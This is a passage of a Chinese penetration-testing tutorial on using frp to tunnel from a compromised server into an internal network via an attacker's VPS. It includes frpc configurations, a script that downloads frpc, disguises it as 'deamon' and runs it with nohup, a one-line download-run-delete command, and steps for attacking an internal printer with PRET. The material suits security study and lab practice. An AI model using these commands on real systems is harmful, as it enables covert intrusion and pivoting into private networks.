    type = http
    local_ip = 127.0.0.1
    local_port = 80
    use_encryption = false
    use_compression = true
    # http 协议认证
    http_user = admin
    http_pwd = admin
    # 如果服务端域名为 frps.com, 可以通过 http://test.frps.com 来访问 [web01] 
    subdomain = web01
    custom_domains = web02.yourdomain.com
    # locations 仅可用于HTTP类型
    locations = /,/pic
    host_header_rewrite = example.com
    # params with prefix "header_" will be used to update http request headers
    header_X-From-Where = frp
    health_check_type = http
    # frpc 将会发送一个 GET http 请求 '/status' 来定位http服务
    # http 服务返回 2xx 状态码时即为存活
    health_check_url = /status
    health_check_interval_s = 10
    health_check_max_failed = 3
    health_check_timeout_s = 3
    [web02]
    type = https
    local_ip = 127.0.0.1
    local_port = 8000
    use_encryption = false
    use_compression = false
    subdomain = web01
    custom_domains = web02.yourdomain.com
    # v1 或 v2 或 空
    proxy_protocol_version = v2
    [plugin_unix_domain_socket]
    type = tcp
    remote_port = 6003
    plugin = unix_domain_socket
    plugin_unix_path = /var/run/docker.sock
    [plugin_http_proxy]
    type = tcp
    remote_port = 6004
    plugin = http_proxy
    plugin_http_user = abc
    plugin_http_passwd = abc
    [plugin_socks5]
    type = tcp
    remote_port = 6005
    plugin = socks5
    plugin_user = abc
    plugin_passwd = abc
    [plugin_static_file]
    type = tcp
    remote_port = 6006
    plugin = static_file
    plugin_local_path = /var/www/blog
    plugin_strip_prefix = static
    plugin_http_user = abc
    plugin_http_passwd = abc
    [plugin_https2http]
    type = https
    custom_domains = test.yourdomain.com
    plugin = https2http
    plugin_local_addr = 127.0.0.1:80
    plugin_crt_path = ./server.crt
    plugin_key_path = ./server.key
    plugin_host_header_rewrite = 127.0.0.1
    [secret_tcp]
    # 如果类型为 secret tcp, remote_port 将失效
    type = stcp
    # sk 用来进行访客认证
    sk = abcdefg
    local_ip = 127.0.0.1
    local_port = 22
    use_encryption = false
    use_compression = false
    # 访客端及服务端的用户名应该相同
    [secret_tcp_visitor]
    # frpc role visitor -> frps -> frpc role server
    role = visitor
    type = stcp
    # 要访问的服务器名称
    server_name = secret_tcp
    sk = abcdefg
    # 将此地址连接到访客 stcp 服务器
    bind_addr = 127.0.0.1
    bind_port = 9000
    use_encryption = false
    use_compression = false
    [p2p_tcp]
    type = xtcp
    sk = abcdefg
    local_ip = 127.0.0.1
    local_port = 22
    use_encryption = false
    use_compression = false
    [p2p_tcp_visitor]
    role = visitor
    type = xtcp
    server_name = p2p_tcp
    sk = abcdefg
    bind_addr = 127.0.0.1
    bind_port = 9001
    use_encryption = false
    use_compression = false
对于配置文件，frp 官方有中文文档，已经十分详尽
不得不说，虽然程序号称还处于开发中，但是通过配置文件可以看到已经支持很多好用的功能了，接下来根据在渗透测试中不同的需要来测试一下
## 四、功能性测试
本次测试模拟攻击者入侵网站进行渗透测试  
攻击者电脑：macbookpro 192.168.88.101  
攻击者VPS：ubuntu 103.242.135.137  
被入侵的服务器：centos 10.10.99.33  
内网其他应用：内网打印机 10.10.65.9
为了方便查看及调试，在测试过程中将持续开启服务端web页面，服务端配置为：
    [common]
    bind_addr = 0.0.0.0
    bind_port = 7000
    # IP 与 bind_addr 默认相同，可以不设置
    # dashboard_addr = 0.0.0.0
    # 端口必须设置，只有设置web页面才生效
    dashboard_port = 7500
    # 用户密码保平安
    dashboard_user = su18
    dashboard_pwd = X758@Kp9eG1xzyYS
    # 允许客户端绑定的端口
    allow_ports = 40000-50000
运行服务后可看到web端
为了方便测试，在渗透测试机上建立文件
文件内容:
    # 这里是要下载不同版本的 frp 文件
    wget https://github.com/fatedier/frp/releases/download/v0.28.2/frp_0.28.2_linux_amd64.tar.gz -o /tmp/yU6te2.tar.gz
    tar -zx /tmp/yU6te2.tar.gz frp_0.28.2_linux_amd64/frpc --strip-components 1
    mv frpc deamon
    rm -rf /tmp/yU6te2.tar.gz
    # 这里写客户端配置文件
    echo -e "[common]nserver_addr = 103.242.135.137nserver_port = 7000ntls_enable = truenpool_count = 5nn[plugin_socks]ntype = tcpnremote_port = 46075nplugin = socks5nplugin_user = josephnplugin_passwd = bnbm#yBZ90adnuse_encryption = truenuse_compression = true" > delphi.ini
    # 启动
    nohup ./deamon -c delphi.ini &
脚本比较简单不多说了
###  1.socks协议代理
首先最简单常用的就是socks协议代理，这一功能在 frp 中是以插件的形式实现的
客户端配置：
    [common]
    # 远程VPS地址
    server_addr = 103.242.135.137
    server_port = 7000
    tls_enable = true
    pool_count = 5
    [plugin_socks]
    type = tcp
    remote_port = 46075
    plugin = socks5
    plugin_user = joseph
    plugin_passwd = bnbm#yBZ90ad
    use_encryption = true
    use_compression = true
在被入侵的服务器上执行如下命令一键部署
wget  >/dev/null 2>&1 && chmod +x 3Edsr9I &&
./3Edsr9I && rm -rf 3Edsr9I
可以看到 Client Counts 及 Proxy Counts 均产生了变化
此时我们将流量通过 socks 协议指到服务端，是用 shadowsocks/Proxifier/proxychains 就看个人爱好了
我的爱好是 Proxifier，配置好 socks IP/端口/身份认证 后可以看到成功代理访问到内网打印机
因为在渗透测试过程中一直使用 reGeorg + Proxifier，跟这种实际上是差不多的
如果常用的工具中有指定代理的功能，也可以直接进行配置，无需 Proxifier 等工具，例如 Burpsuite
在大多数情况下，到目前为止简单的配置已经能够满足大部分的需求，说白了作为一名 web 狗，你会的攻击手段90% 是 http 协议，可能还会用点
msf，发点 tcp 流的攻击 payload 等等，总而言之基本上都是 tcp 协议的攻击
而至于 UDP，socks5 协议在本质上是已经支持 UDP
协议，虽然协议是支持了，但是你所使用的工具、代理、软件等端级的代码并不一定能够支持，这将会直接导致 UDP 协议的数据包无法进行交互
###  2.UDP协议代理
frp 也同时能够对 UDP 协议进行转发，配置上与 tcp 也是差不多的，基本上就是端口转发，把你想要发送数据包的端口通过隧道映射出来，配置上没什么难度
    [dns]
    type = udp
    local_ip = *.*.*.*
    local_port = *
    remote_port = 42231
对于UDP协议的测试，我们使用比较常见的SNMP协议和DNS协议来测试
首先是SNMP协议，端口161，在渗透测试过程中扫内网的时候，难免会遇见两个打印机，在攻击打印机的时候基本是抱着蚊子再小也是肉的情况去渗透的
但是在一次渗透中，对于服务器段的工作已经完成了，想要进一步的入侵管理员的办公网段，扫了很久都没有得到有效的网段，于是想到了打印机，通过 snmp 协议和
惠普的 pjl 来获得敏感信息，拿出了连接打印机的网段，并后续成功打入管理员电脑
这次就依旧来复现一下这个过程，我们通过 frp 隧道对公司内网打印机 10.10.65.9 进行攻击，使用的是打印机攻击框架 PRET，简单的打印一个文档
下图可以看到成功打印（吹一波 ver007，哈哈）
可以利用这个框架进行很多的操作，这里不细说了
接下来我们测试 DNS，DNS 接触的更多，UDP 53端口，将域名解析成为IP